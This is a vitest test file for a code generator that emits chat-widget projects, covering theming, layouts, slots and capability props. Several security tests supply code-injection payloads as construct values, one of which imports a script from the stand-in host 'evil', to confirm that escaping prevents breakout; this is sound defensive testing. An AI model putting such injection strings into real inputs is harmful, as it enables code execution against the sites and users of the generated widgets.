import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import ts from 'typescript';
import {
  accentContrastNotice,
  generateProject,
  mergeToolArgsIntoFormDefaults,
  resolveContrastForeground,
  writeProject,
} from './codegen';
import { validateConstruct, type Construct } from './schema';

function construct(overrides: Partial<Construct> = {}): Construct {
  const out = validateConstruct({
    name: 'acme-support',
    layout: 'widget',
    provider: { mode: 'mock' },
    ...overrides,
  });
  if (!out.ok) throw new Error(JSON.stringify(out.problems));
  return out.construct;
}

const file = (files: { path: string; code: string }[], path: string) => {
  const f = files.find((f) => f.path === path);
  if (!f) throw new Error(`missing ${path}; got ${files.map((x) => x.path).join(', ')}`);
  return f.code;
};

describe('generateProject (widget + mock core)', () => {
  it('emits the full project file set', () => {
    const paths = generateProject(construct()).map((f) => f.path).sort();
    expect(paths).toEqual(
      [
        'index.html',
        'package.json',
        'src/App.tsx',
        'src/element.tsx',
        'tsconfig.json',
        'vite.config.lib.ts',
        'vite.config.ts',
      ].sort(),
    );
  });

  it('is deterministic: same construct, same bytes', () => {
    expect(generateProject(construct())).toEqual(generateProject(construct()));
  });

  it('facade registers the construct name via @kitn.ai/ui/define', () => {
    const code = file(generateProject(construct()), 'src/element.tsx');
    expect(code).toContain("import { defineWebComponent } from '@kitn.ai/ui/define'");
    expect(code).toContain("defineWebComponent('acme-support'");
  });

  it('mock glue imports state + wire — never a hand-rolled SSE reader', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/state'");
    expect(app).toContain("from '@kitn.ai/ui/wire'");
    expect(app).not.toMatch(/text\/event-stream|EventSource|split\('\\n\\n'\)/);
  });

  it('theme accent lands on the HOST element as --kai-color-primary; mode maps onto the theme prop', () => {
    // Must be set on the host (via ctx.element in element.tsx), not anywhere
    // inside the shadow tree (App.tsx): the kit's --color-primary token is
    // resolved by a rule scoped to `:root, :host`, so --kai-color-primary set
    // on a descendant inside the shadow root never reaches it — custom
    // property inheritance only flows downward from where a property is
    // actually declared, and :host's own --color-primary is fixed at :host.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    expect(element).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
    // Not set anywhere inside App.tsx (the shadow-tree content) — that was
    // the bug: it looked wired but never reached the launcher or the bubble.
    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-primary');
  });

  it('a hostile accent cannot break out of the emitted string literal', () => {
    // The schema places no charset constraint on `accent` ("any CSS color"); a
    // value containing a single quote must not let attacker-controlled text
    // become live source in the emitted element.tsx (e.g. closing the literal
    // and injecting a new statement/import).
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const element = file(generateProject(construct({ theme: { accent: hostile, mode: 'system' } })), 'src/element.tsx');
    // The raw payload must never appear unescaped/unquoted in the source.
    expect(element).not.toContain(`setProperty('--kai-color-primary', '${hostile}')`);
    // It must appear only inside a properly JSON-escaped string literal — i.e.
    // the single quote in the payload is escaped, so it cannot terminate the
    // literal early.
    expect(element).toContain(`setProperty('--kai-color-primary', ${JSON.stringify(hostile)})`);
    // The raw text right after the call, unescaped, must never be followed by
    // an unescaped `'` — i.e. no bare `'red'` breakout.
    expect(element).not.toMatch(/setProperty\('--kai-color-primary', 'red'\)/);
  });

  it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
    const pkg = (spec?: string) =>
      JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
    expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
    expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
  });

  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
    // A named import with no reference anywhere else in the file fails TS6133
    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
    // Grepping for a bare, never-referenced `type { X }` import is a cheap
    // proxy for that without running tsc on the emitted string.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
  });

  it('emits no non-kit utility classes (interior styling rule)', () => {
    for (const f of generateProject(construct())) {
      expect(f.code).not.toMatch(/class(Name)?="(flex|grid|p-\d|m-\d|text-)/);
    }
  });

  it('composes the kit\'s MOST-INTEGRATED chat surface — ChatThread, the same composition <kai-chat> renders', () => {
    // T5 demo defect history: a hand-rolled <For>/<Message>/<MessageContent>
    // list had no padding, no gap, both roles left-aligned (round 3); Thread +
    // a hand-composed PromptInput/Button sat flush against the Dock panel and
    // clipped a focus ring (round 4 patched the symptom with inline padding).
    // Owner-ruled root cause: emitApp was re-deriving layout the kit already
    // owns. ChatThread (chat-thread.tsx) — the same composition
    // src/elements/chat.tsx renders behind <kai-chat> — owns the message
    // list AND the composer (padding, focus ring, send button) as one unit,
    // so there is nothing left here to restate.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/solid'");
    expect(app).toContain('<ChatThread messages={chat.messages()}');
    expect(app).toContain('onSubmit={submit}');
    // Every hand-composed primitive from earlier rounds must be GONE, not
    // supplemented: no bare Thread, no hand-rolled message loop, no manually
    // composed PromptInput/composer chrome.
    expect(app).not.toMatch(/<For each=\{chat\.messages\(\)\}/);
    expect(app).not.toContain('<MessageContent');
    expect(app).not.toContain('<Thread ');
    expect(app).not.toContain('<PromptInput');
    expect(app).not.toContain('<Button');
  });

  it('gates undeclared-capability affordances OFF: no-capability-vocabulary construct explicitly disables webSearch, voice and attach', () => {
    // Format rule: an undeclared capability's affordance must be OFF. The v1
    // construct schema carries no capability vocabulary at all yet (lands
    // Task 9), so every construct today is "no capabilities declared" — these
    // must be explicitly false, not just omitted, so the gating decision is
    // visible in the emitted source.
    //
    // `attach` was a real kit gap as of the previous round (ChatThread had no
    // passthrough to DefaultPromptInput's disabling prop) — closed upstream
    // (ChatThreadProps now forwards `attach`, mirroring webSearch/voice), so
    // this is a real functional assertion now, not a documented-gap stand-in.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('webSearch={false}');
    expect(app).toContain('voice={false}');
    expect(app).toContain('attach={false}');
    // No starter prompts, no model switcher: omitted entirely (undefined has
    // the same off-by-default effect as explicit false for these two).
    expect(app).not.toMatch(/\bsuggestions=\{/);
    expect(app).not.toMatch(/\bmodels=\{/);
  });

  it('ratchet: App.tsx carries (near) zero hand-authored inline styles now that ChatThread owns layout', () => {
    // Every prior round's fix for a layout defect (composer padding,
    // send-button alignment, the accent CSS var) was ANOTHER inline style —
    // treating the symptom, not the cause. This is the ratchet the owner
    // asked for: count `style={{` occurrences in the shadow-tree content
    // (App.tsx) and fail if it creeps back up. It's currently zero because
    // ChatThread + Dock need no per-instance layout styling from us at all;
    // if a future change needs one, it should be a deliberate, reviewed
    // increase to this bound, not a silent regression back to hand-styling.
    const app = file(generateProject(construct()), 'src/App.tsx');
    const inlineStyleCount = (app.match(/style=\{\{/g) ?? []).length;
    expect(inlineStyleCount).toBe(0);
  });

  it('index.html carries a demo host-page hint for the widget layout, outside the element', () => {
    // Owner feedback: a blank white page with one small launcher confused a
    // first-time viewer of the preview. The hint is a HOST-page nicety, not
    // part of the emitted widget — it must sit outside the custom element.
    const html = file(generateProject(construct()), 'index.html');
    expect(html).toMatch(/This blank page stands in for your site/);
    expect(html).toMatch(/bottom-right corner/);
    const hintIndex = html.indexOf('This blank page stands in for your site');
    const elementIndex = html.indexOf('<acme-support>');
    expect(hintIndex).toBeGreaterThan(-1);
    expect(elementIndex).toBeGreaterThan(-1);
    expect(hintIndex).toBeLessThan(elementIndex);
  });

  it('routes the theme accent onto the HOST only — App.tsx (message content) carries no accent/primary token at all', () => {
    // Owner ruling: "accent brands CONTROLS, never content." element.tsx sets
    // --kai-color-primary once, on the host; the launcher (dock.tsx's own
    // CSS) and the composer's send button (rendered inside ChatThread's
    // DefaultPromptInput, using the kit's own Button `variant="default"`)
    // pick it up for free via ordinary custom-property inheritance — no
    // per-control code needed in App.tsx at all.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    const app = file(files, 'src/App.tsx');
    // Exactly one hardcoded accent hex in the whole project: the
    // JSON.stringify'd custom-property value in element.tsx.
    const hexOccurrences = (element + app).match(/#e91e63/g) ?? [];
    expect(hexOccurrences).toHaveLength(1);
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    // App.tsx (the shadow-tree content ChatThread renders messages into)
    // authors NO styling at all any more — not a hex, not a CSS custom
    // property, not a Tailwind primary/accent utility class. If a future
    // regression routes the accent onto message content again, it will
    // necessarily show up as new text here, since today there is none.
    expect(app).not.toMatch(/#[0-9a-fA-F]{3,8}\b/);
    expect(app).not.toContain('--color-primary');
    expect(app).not.toContain('--kai-color-primary');
    expect(app).not.toMatch(/\btext-primary\b/);
    expect(app).not.toMatch(/\bbg-primary\b/);
    expect(app).not.toContain('[data-role="user"]');
    expect(app).not.toContain('[part="bubble content"]');
  });
});

describe('widget chrome (Task 19a)', () => {
  it('position threads onto Dock as a plain prop (closed enum, no escaping needed)', () => {
    const app = file(
      generateProject(construct({ widget: { position: 'top-start' } })),
      'src/App.tsx',
    );
    expect(app).toContain('<Dock label="acme-support" position="top-start">');
  });

  it('no widget field: Dock unchanged from before Task 19a', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
  });

  it('launcherIcon renders an <img> launcher override, JSON.stringify-escaped', () => {
    const app = file(
      generateProject(construct({ widget: { launcherIcon: 'https://example.com/a.png' } })),
      'src/App.tsx',
    );
    expect(app).toContain('launcher={<img src={"https://example.com/a.png"}');
  });

  it('a hostile launcherIcon cannot break out of the emitted string literal', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ widget: { launcherIcon: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // The hostile payload's own embedded `"` must stay backslash-escaped
    // (JSON.stringify's doing), never appear as a raw, unescaped
    // string-closing quote immediately followed by `};alert(1)` — that raw
    // form is what a vulnerable `src="${launcherIcon}"` interpolation would
    // emit and is the actual breakout. A plain `.not.toContain('alert(1);//"')`
    // can't discriminate here: JSON.stringify's own closing delimiter always
    // sits right after `//` in the payload, safe or not, so that substring is
    // present either way — the backslash before the *embedded* quote is the
    // real signal.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('non-widget layouts never see widget props even if somehow present at the type level', () => {
    // schema already rejects this construct-side; codegen only needs to prove
    // the widget-only emit path is gated on c.layout === 'widget'.
    const app = file(generateProject(construct({ layout: 'fullscreen' })), 'src/App.tsx');
    expect(app).not.toContain('position=');
  });

  it('widget.defaultOpen true emits defaultOpen={true} on Dock', () => {
    const app = file(
      generateProject(construct({ widget: { defaultOpen: true } })),
      'src/App.tsx',
    );
    expect(app).toContain('<Dock label="acme-support" defaultOpen={true}>');
  });

  it('widget.defaultOpen false or absent: no defaultOpen prop at all (off-by-default gating)', () => {
    const appFalse = file(
      generateProject(construct({ widget: { defaultOpen: false } })),
      'src/App.tsx',
    );
    expect(appFalse).not.toContain('defaultOpen');
    const appAbsent = file(generateProject(construct()), 'src/App.tsx');
    expect(appAbsent).not.toContain('defaultOpen');
  });
});

describe('header (Task 19c)', () => {
  it('header.title threads into ChatThread\'s own chatTitle prop', () => {
    const app = file(
      generateProject(construct({ header: { title: 'Acme Support' } })),
      'src/App.tsx',
    );
    expect(app).toContain('chatTitle={"Acme Support"}');
  });

  it('no header declared: no chatTitle prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('chatTitle');
  });

  it('a hostile title cannot break out of the emitted string literal', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ header: { title: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // Same discriminator as the launcherIcon hostile-payload test above (Task
    // 19a): JSON.stringify's own closing delimiter always lands right after
    // `//` in this payload, safe or not, so a plain
    // `.not.toContain('alert(1);//"')` can't tell safe output from a real
    // breakout — it would fail against CORRECTLY escaped output too. The
    // real signal is whether the embedded quote right before `};alert(1)`
    // is backslash-escaped.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('custom layout: header.title is NOT wired (Thread has no chatTitle prop) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], header: { title: 'x' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('chatTitle');
  });
});

describe('empty (Task 14 — welcome-screen)', () => {
  it('threads empty={true} onto ChatThread and the Empty composition through a Portal onto the host element, tagged slot="empty"', () => {
    const app = file(
      generateProject(construct({ empty: { title: 'Hi, welcome' } })),
      'src/App.tsx',
    );
    expect(app).toContain('empty={true}');
    // Portal always wraps its children in its OWN container div appended
    // directly to `mount` — an attribute on a nested child (e.g. on
    // `<Empty>`) is invisible to slot assignment, which only looks at direct
    // children of the shadow host. So `slot="empty"` has to land on Portal's
    // own wrapper via its `ref` callback, confirmed against a real ejected
    // widget cell in a browser (a `slot="empty"` on `<Empty>` itself left
    // `assignedNodes()` empty and the greeting never painted).
    expect(app).toContain(
      "<Portal mount={props.element} ref={(el) => el.setAttribute('slot', 'empty')}>",
    );
    expect(app).toContain('<Empty>');
    expect(app).toContain('<EmptyTitle>{"Hi, welcome"}</EmptyTitle>');
    // App has to receive the host element to portal into — that's a real
    // signature change, only when `empty` is declared.
    expect(app).toContain('export function App(props: { element: HTMLElement })');
    expect(app).toContain("import { Portal } from 'solid-js/web';");
    expect(app).toContain('Empty, EmptyHeader, EmptyTitle } from \'@kitn.ai/ui/solid\';');
  });

  it('description present: EmptyDescription is imported and emitted; absent: neither is', () => {
    const withDesc = file(
      generateProject(construct({ empty: { title: 'Hi', description: 'We can help.' } })),
      'src/App.tsx',
    );
    expect(withDesc).toContain('EmptyDescription');
    expect(withDesc).toContain('<EmptyDescription>{"We can help."}</EmptyDescription>');
    const noDesc = file(generateProject(construct({ empty: { title: 'Hi' } })), 'src/App.tsx');
    expect(noDesc).not.toContain('EmptyDescription');
  });

  it('icon present: EmptyMedia is imported and emitted as an <img>; absent: neither is', () => {
    const withIcon = file(
      generateProject(construct({ empty: { title: 'Hi', icon: 'https://example.com/icon.png' } })),
      'src/App.tsx',
    );
    expect(withIcon).toContain('EmptyMedia');
    expect(withIcon).toContain('<img src={"https://example.com/icon.png"}');
    const noIcon = file(generateProject(construct({ empty: { title: 'Hi' } })), 'src/App.tsx');
    expect(noIcon).not.toContain('EmptyMedia');
  });

  it('no empty declared: no empty prop, no Portal usage/import, no Empty-composition import, App() keeps its original zero-arg signature', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    // The capability-gating doc comment above App() names "empty"/"Portal" in
    // prose regardless (same discriminator as the reasoningOpen precedent
    // above: a plain `.not.toContain` would false-fail on that comment) — the
    // real signal is actual code usage: an import, a JSX tag, or a prop.
    expect(app).not.toMatch(/\bempty=\{true\}/);
    expect(app).not.toMatch(/import \{ Portal \}/);
    expect(app).not.toMatch(/<Portal /);
    expect(app).not.toMatch(/<Empty /);
    expect(app).not.toMatch(/, Empty,/);
    expect(app).toContain('export function App() {');
  });

  // The whole point of the welcome screen: greeting AND starter chips both
  // render for an empty thread. ChatThread's own doc comment on `empty`
  // states the REPLACE slot only stands in for the empty MESSAGE LIST — the
  // composer and its suggestions still render below it — so wiring both
  // fields must never make one crowd out the other in the emitted source.
  it('empty + starters both declared: both the welcome greeting and the suggestions prop are wired, independently — chips survive', () => {
    const app = file(
      generateProject(
        construct({
          empty: { title: 'Hi, welcome', description: 'Ask us anything.' },
          capabilities: { starters: ["Where's my order?", 'Request a refund'] },
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('empty={true}');
    expect(app).toContain('<EmptyTitle>{"Hi, welcome"}</EmptyTitle>');
    expect(app).toContain('suggestions={["Where\'s my order?","Request a refund"]}');
    // Both attributes land on the SAME <ChatThread ... /> tag — the empty
    // Portal is not a substitute for the suggestions prop, and vice versa.
    const chatThreadLine = app.split('\n').find((l) => l.includes('<ChatThread '));
    expect(chatThreadLine).toBeDefined();
    expect(chatThreadLine).toContain('empty={true}');
    expect(chatThreadLine).toContain('suggestions={');
  });

  it('a hostile title/description cannot break out of their emitted string literals', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({ empty: { title: hostile, description: hostile } })),
      'src/App.tsx',
    );
    expect(app).toContain(JSON.stringify(hostile));
    // Same discriminator as the launcherIcon/header.title/userId precedent
    // (Tasks 19a/19c/19e): JSON.stringify's own closing delimiter always
    // lands right after `//` in this payload, safe or not, so a plain
    // `.not.toContain('alert(1);//"')` can't distinguish safe output from a
    // real breakout. The real signal is whether the embedded quote right
    // before `};alert(1)` is backslash-escaped.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
  });

  it('custom layout: empty is NOT wired (Thread has no empty slot) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], empty: { title: 'x' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('empty={true}');
    expect(app).not.toContain('<Portal');
  });
});

describe('userId (Task 19e)', () => {
  it('endpoint provider: threads x-kai-user-id header onto the chat fetch', () => {
    const app = file(
      generateProject(construct({
        provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
        userId: 'user_123',
      })),
      'src/App.tsx',
    );
    expect(app).toContain(`'x-kai-user-id': "user_123"`);
  });

  it('no userId: no header added, fetch calls unchanged from before this task', () => {
    const app = file(
      generateProject(construct({ provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('x-kai-user-id');
  });

  it('history local: userId folds into THREAD_KEY so different users don\'t share localStorage history', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } }, userId: 'user_123' })),
      'src/App.tsx',
    );
    expect(app).toContain('kai:acme-support:user_123:thread');
  });

  it('history local, no userId: THREAD_KEY unchanged from before this task', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('kai:acme-support:thread');
    expect(app).not.toContain('kai:acme-support:undefined:thread');
  });

  it('history endpoint: GET and PUT both carry the header', () => {
    const app = file(
      generateProject(construct({
        capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } },
        userId: 'user_123',
      })),
      'src/App.tsx',
    );
    const occurrences = app.split(`'x-kai-user-id': "user_123"`).length - 1;
    expect(occurrences).toBe(2); // GET + PUT
  });

  it('a hostile userId cannot break out of the emitted string literal at any of the three sites', () => {
    const hostile = '"};alert(1);//';
    const app = file(
      generateProject(construct({
        provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
        capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } },
        userId: hostile,
      })),
      'src/App.tsx',
    );
    // A plain `.not.toContain('alert(1);//"')` is vacuous here (same class as
    // the Task 19a/19c precedent, launcherIcon/header.title): JSON.stringify's
    // own closing delimiter always lands right after `//` in this payload,
    // safe or not, so that substring is present either way. The real signal
    // is whether the embedded quote right before `};alert(1)` is
    // backslash-escaped (JSON.stringify's doing) rather than a raw,
    // string-closing quote — the actual breakout shape.
    expect(app).not.toMatch(/(?<!\\)"\};alert\(1\)/);
    const stringified = JSON.stringify(hostile);
    expect(app.split(stringified).length - 1).toBeGreaterThanOrEqual(3); // provider POST + history GET + PUT
  });

  it('mock provider + no history: userId declared but inert — no crash, no emission anywhere', () => {
    const app = file(generateProject(construct({ userId: 'user_123' })), 'src/App.tsx');
    expect(app).not.toContain('x-kai-user-id');
  });
});

describe('layouts (Task 12)', () => {
  it.each([
    ['fullscreen', 'height: \'100dvh\''],
    ['aside', 'border-inline-start'],
    ['split', 'WorkspaceShell'],
  ] as const)('layout %s emits its chrome', (layout, marker) => {
    const app = file(generateProject(construct({ layout })), 'src/App.tsx');
    expect(app).toContain(marker);
    expect(app).not.toContain('<Dock');
  });

  it('widget stays unchanged: still wraps in Dock, no other layout chrome', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
    expect(app).not.toContain('WorkspaceShell');
  });

  it('split: real draggable splitter via WorkspaceShell, not a hand-rolled flex row', () => {
    const app = file(generateProject(construct({ layout: 'split' })), 'src/App.tsx');
    expect(app).toContain('<WorkspaceShell');
    expect(app).toContain('end={');
    expect(app).toContain('<slot name="pane" />');
    expect(app).not.toContain('PaneGroup');
  });

  it('index.html gates the widget-specific host hint to the widget layout only', () => {
    for (const layout of ['fullscreen', 'aside', 'split'] as const) {
      const html = file(generateProject(construct({ layout })), 'index.html');
      expect(html).not.toMatch(/bottom-right corner/);
    }
  });
});

describe('mobile takeover (Task 19d)', () => {
  it('aside: emits a scoped @media(max-width:480px) full-bleed override, mirroring Dock\'s own rule', () => {
    const app = file(generateProject(construct({ layout: 'aside' })), 'src/App.tsx');
    expect(app).toContain('data-kai-layout="aside"');
    expect(app).toMatch(/@media \(max-width: 480px\)/);
    expect(app).toContain('[data-kai-layout="aside"]');
  });

  it('split: wires WorkspaceShell\'s own drawerBelow prop instead of hand-rolled CSS', () => {
    const app = file(generateProject(construct({ layout: 'split' })), 'src/App.tsx');
    expect(app).toContain('drawerBelow={480}');
    // No second @media block for split — it delegates to the kit's own mobile mode.
    expect(app).not.toMatch(/@media \(max-width: 480px\)[^]*WorkspaceShell/);
  });

  it('fullscreen: unchanged — already full-bleed at every width, nothing emitted', () => {
    const app = file(generateProject(construct({ layout: 'fullscreen' })), 'src/App.tsx');
    expect(app).not.toMatch(/@media \(max-width: 480px\)/);
    expect(app).not.toContain('drawerBelow');
  });

  it('widget: untouched by this task (Dock already ships its own mobile mode)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('<Dock label="acme-support">');
  });
});

describe('slots (Task 13)', () => {
  it('declared slots become named <slot> projection points', () => {
    const app = file(generateProject(construct({ slots: ['header'] })), 'src/App.tsx');
    expect(app).toContain('<slot name="header" />');
  });

  it('custom layout: minimal chrome, every slot present, spine intact', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header', 'footer'] })),
      'src/App.tsx',
    );
    expect(app).toContain('<slot name="header" />');
    expect(app).toContain('<slot name="footer" />');
    expect(app).toContain('<PromptInput'); // the spine is implied, never dropped
    expect(app).not.toContain('<Dock');
  });
});

describe('capabilities.starters', () => {
  it('starters thread into ChatThread\'s own suggestions prop, which already submits on click', () => {
    // ChatThread (chat-thread.tsx) already owns starter-prompt rendering AND
    // submission end to end: its `suggestions` prop renders the chips, hides
    // them once `messages` is non-empty, and (default suggestionMode
    // "submit") calls onSubmit with the clicked text. So there is nothing to
    // hand-compose here — the construct's starters thread straight into that
    // existing prop.
    const app = file(
      generateProject(construct({ capabilities: { starters: ['Track my order', 'Request a refund'] } })),
      'src/App.tsx',
    );
    expect(app).toContain('suggestions={["Track my order","Request a refund"]}');
    expect(app).toContain('<ChatThread messages={chat.messages()}');
    // No hand-rolled chip list — that would be restating layout ChatThread
    // already owns (the same lesson the ratchet test above pins).
    expect(app).not.toContain('<For each={chat.suggestions');
  });

  it('no starters, no suggestions prop at all (spine declares deviations only)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toMatch(/\bsuggestions=\{/);
  });

  it('a hostile starter cannot break out of the emitted array literal', () => {
    const hostile = "'}); alert(1); ({x:'";
    const app = file(
      generateProject(construct({ capabilities: { starters: [hostile] } })),
      'src/App.tsx',
    );
    expect(app).toContain(`suggestions={${JSON.stringify([hostile])}}`);
    expect(app).not.toContain(`suggestions={['${hostile}']}`);
  });
});

describe('capabilities.reasoning', () => {
  it('"compact" threads into ChatThread\'s own reasoning prop as a plain string', () => {
    const app = file(
      generateProject(construct({ capabilities: { reasoning: 'compact' } })),
      'src/App.tsx',
    );
    expect(app).toContain('reasoning="compact"');
    expect(app).toContain('<ChatThread messages={chat.messages()}');
  });

  it('"off" threads into the same prop', () => {
    const app = file(generateProject(construct({ capabilities: { reasoning: 'off' } })), 'src/App.tsx');
    expect(app).toContain('reasoning="off"');
  });

  it('explicit "full" emits no reasoning prop at all — same as omitting the field entirely', () => {
    const explicit = file(
      generateProject(construct({ capabilities: { reasoning: 'full' } })),
      'src/App.tsx',
    );
    const omitted = file(generateProject(construct()), 'src/App.tsx');
    expect(explicit).not.toMatch(/\breasoning=/);
    expect(omitted).not.toMatch(/\breasoning=/);
    expect(explicit).toEqual(omitted);
  });

  it('reasoningOpen true emits reasoningOpen={true} on ChatThread', () => {
    const app = file(
      generateProject(construct({ capabilities: { reasoningOpen: true } })),
      'src/App.tsx',
    );
    expect(app).toContain('reasoningOpen={true}');
  });

  it('reasoningOpen false/absent: no prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('reasoningOpen');
  });

  it('custom layout: reasoningOpen is NOT wired (Thread has no reasoningOpen prop) — declared loudly, matching CU-1\'s precedent for undeclared capabilities on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { reasoningOpen: true } })),
      'src/App.tsx',
    );
    // The exclusion-disclosure comment (CU-1, below) names "reasoningOpen" in
    // prose, so a plain `.not.toContain` would false-fail on that comment —
    // assert no PROP usage (`reasoningOpen=`) instead.
    expect(app).not.toMatch(/\breasoningOpen=/);
  });
});

// CU-1: pin the emitted exclusion-disclosure comment itself, so a refactor of
// emitCustomApp can't silently drop the loud-declaration this format commits
// to for `custom` layout. The list below is a literal restatement of the
// capabilities emitCustomApp deliberately leaves unwired (starters,
// attachments, reasoning display-mode, reasoningOpen, header.title, empty) —
// it must be kept in sync BY HAND with that function's own comment (and with
// the "not wired" tests above/below that each capability carries) whenever
// the custom-layout exclusion list changes.
describe('CU-1: custom layout exclusion disclosure', () => {
  it('the emitted comment names every capability NOT wired on custom, so a silent drop cannot ship unnoticed', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'] })),
      'src/App.tsx',
    );
    const excludedCapabilities = [
      'starters',
      'attachments',
      'reasoning display-mode',
      'reasoningOpen',
      'header.title',
      'empty',
    ];
    for (const capability of excludedCapabilities) {
      expect(app).toContain(capability);
    }
  });
});

describe('capabilities.attachments', () => {
  it('threads accept into ChatThread\'s own attach/accept props — the paperclip, staging, and FileReader.readAsDataURL round-trip already live in ChatThread/DefaultPromptInput; nothing to hand-compose', () => {
    // Branch reality (post kit-fix 93af0f62 + Task 3 gating): ChatThread
    // already owns the whole attach affordance end to end — the button, the
    // hidden file input, staging previews, reading each file with
    // FileReader.readAsDataURL (never URL.createObjectURL), and handing the
    // staged list back via onSubmit's `attachments`. Its Message component
    // already groups consecutive file parts into one <Attachments> row. So
    // codegen's only job is threading the construct's accept list into the
    // existing attach/accept props — hand-rolling a second picker or a
    // second file-part renderer here would restate what the kit already
    // owns, exactly the lesson `capabilities.starters` pinned above.
    const app = file(
      generateProject(construct({ capabilities: { attachments: { accept: ['image/*', 'application/pdf'] } } })),
      'src/App.tsx',
    );
    expect(app).toContain('attach={true}');
    expect(app).toContain('accept={"image/*,application/pdf"}');
    // The construct's own submit() folds the picked attachments into the
    // outgoing user message's parts — the one piece createKaiChat's
    // append/streamAssistant ops don't do on their own.
    expect(app).toContain("type: 'file' as const, attachment");
    expect(app).toContain('detail.attachments.map');
    // No hand-rolled file input/FileReader/Attachments import: that would be
    // restating ChatThread + Message's own implementation.
    expect(app).not.toContain('readAsDataURL');
    expect(app).not.toContain('createObjectURL');
    expect(app).not.toContain('<Attachments');
    expect(app).not.toContain('<Attachment ');
  });

  it('no attachments capability, attach stays explicitly off and no accept prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('attach={false}');
    expect(app).not.toMatch(/\baccept=\{/);
  });

  it('a hostile accept entry cannot break out of the emitted string literal (JSON.stringify, not a raw JSX attribute string)', () => {
    const hostile = '"} onLoad={alert(1)} x={"';
    const app = file(
      generateProject(construct({ capabilities: { attachments: { accept: [hostile] } } })),
      'src/App.tsx',
    );
    expect(app).toContain(`accept={${JSON.stringify(hostile)}}`);
    expect(app).not.toContain(`accept="${hostile}"`);
  });
});

describe('capabilities.history', () => {
  it('history local: load-on-mount + persist-on-change via localStorage, keyed by tag', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('localStorage');
    // JSON.stringify'd (double-quoted), same convention as the endpoint url
    // below and provider.url — not the brief's hand-typed single-quote form.
    expect(app).toContain(JSON.stringify('kai:acme-support:thread'));
    expect(app).toContain('createEffect');
  });

  it('history endpoint: GET on mount, PUT on change — consumer owns the server', () => {
    // url is JSON.stringify'd at the interpolation site, same convention as
    // provider.url (see "endpoint provider" below) — double-quoted, not the
    // brief's hand-typed single-quote form.
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain(`fetch(${JSON.stringify('/api/thread')})`);
    expect(app).toContain("method: 'PUT'");
  });

  it('history none / absent: no persistence code at all', () => {
    expect(file(generateProject(construct()), 'src/App.tsx')).not.toContain('localStorage');
  });

